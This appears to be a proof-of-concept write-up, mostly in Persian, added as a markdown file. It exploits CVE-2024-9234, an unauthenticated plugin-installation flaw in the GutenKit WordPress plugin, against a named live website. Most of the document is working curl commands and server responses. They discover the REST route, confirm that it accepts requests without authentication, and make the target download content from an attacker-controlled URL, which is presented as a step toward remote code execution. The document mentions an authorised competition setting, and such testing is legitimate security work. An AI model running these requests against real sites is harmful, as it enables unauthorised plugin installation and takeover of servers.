@@ -1,0 +1,154 @@
+## Proof of Concept (PoC) – CVE-2024-9234
+
+### GutenKit Blocks Addon Unauthenticated Plugin Installation
+
+**Target:**
+
+```text
+https://zara.varzeshteam.website/
+```
+
+**Vulnerable Component:**
+
+```text
+gutenkit-blocks-addon
+Version: 2.1.0
+CVE: CVE-2024-9234
+```
+
+اسکن نشان داد افزونه `gutenkit-blocks-addon` نسخه `2.1.0` روی هدف شناسایی شده است. 
+
+---
+
+### 1. بررسی REST API
+
+مسیر مستقیم زیر:
+
+```text
+/wp-json/
+```
+
+پاسخ `404` می‌داد. طبق اسکن، endpointهای عمومی WordPress نیز از مسیر مستقیم `/wp-json/wp/v2/...` محدود یا 404 گزارش شده بودند. 
+
+بنابراین REST API از روش جایگزین `rest_route` بررسی شد:
+
+```bash
+curl -sk "https://zara.varzeshteam.website/?rest_route=/" | jq -r '.routes | keys[]' | grep -i gutenkit
+```
+
+Endpointهای GutenKit از جمله مسیر زیر شناسایی شدند:
+
+```text
+/gutenkit/v1/install-active-plugin
+```
+
+---
+
+### 2. بررسی متدهای HTTP
+
+```bash
+curl -sk -i -X OPTIONS \
+"https://zara.varzeshteam.website/?rest_route=/gutenkit/v1/install-active-plugin"
+```
+
+خروجی:
+
+```text
+Allow: POST, PUT, PATCH
+```
+
+این نشان داد endpoint وجود دارد و درخواست‌های state-changing را می‌پذیرد.
+
+---
+
+### 3. تست بدون Authentication
+
+یک درخواست POST بدون URL ارسال شد:
+
+```bash
+curl -sk -i -X POST \
+  "https://zara.varzeshteam.website/?rest_route=/gutenkit/v1/install-active-plugin" \
+  -H "Content-Type: application/json" \
+  -d '{}'
+```
+
+پاسخ:
+
+```json
+{"success":false,"data":"Failed to download plugin. Error: No URL Provided."}
+```
+
+این پاسخ نشان داد که درخواست بدون Authentication تا منطق دانلود افزونه پردازش شده است.
+
+---
+
+### 4. تست URL کنترل‌شده
+
+یک فایل TXT آزمایشی در یک URL عمومی قرار داده شد و URL آن به endpoint ارسال شد.
+
+درخواست:
+
+```bash
+curl -sk -i -X POST \
+  "https://zara.varzeshteam.website/?rest_route=/gutenkit/v1/install-active-plugin" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "plugin":"https://raw.githubusercontent.com/thekawix/kawan-javanmardi/main/kawan-javanmardi.txt"
+  }'
+```
+
+پاسخ:
+
+```json
+{"success":false,"data":"Failed to unzip plugin. Error: Incompatible Archive."}
+```
+
+این نتیجه نشان می‌دهد که:
+
+* درخواست بدون Authentication پذیرفته شده است.
+* URL کنترل‌شده توسط سرور پردازش شده است.
+* سرور تلاش کرده محتوای URL را به‌عنوان archive پردازش کند.
+* فایل TXT به دلیل archive نبودن رد شده است.
+
+---
+
+## Exploitation Flow
+
+```text
+Unauthenticated Request
+        │
+        ▼
+GutenKit REST API
+        │
+        ▼
+install-active-plugin
+        │
+        ▼
+Attacker-Controlled Plugin URL
+        │
+        ▼
+Target Downloads Remote Content
+        │
+        ▼
+Target Attempts Archive Extraction
+        │
+        ▼
+TXT Rejected: Incompatible Archive
+```
+
+---
+
+## Final Validation Command
+
+برای بازتولید آخرین مرحله PoC:
+
+```bash
+curl -sk -i -X POST \
+  "https://zara.varzeshteam.website/?rest_route=/gutenkit/v1/install-active-plugin" \
+  -H "Content-Type: application/json" \
+  -d '{"plugin":"https://raw.githubusercontent.com/thekawix/kawan-javanmardi/main/kawan-javanmardi.txt"}'
+```
+
+### نتیجه
+
+در این تست، وجود endpoint `install-active-plugin` و پردازش درخواست بدون Authentication تأیید شد. همچنین پاسخ `Incompatible Archive` نشان داد URL کنترل‌شده تا مرحله پردازش archive توسط سرور رسیده است. برای **تأیید کامل نصب افزونه/RCE** باید یک archive معتبر و غیرمخرب در محیط مجاز مسابقه تست شود.
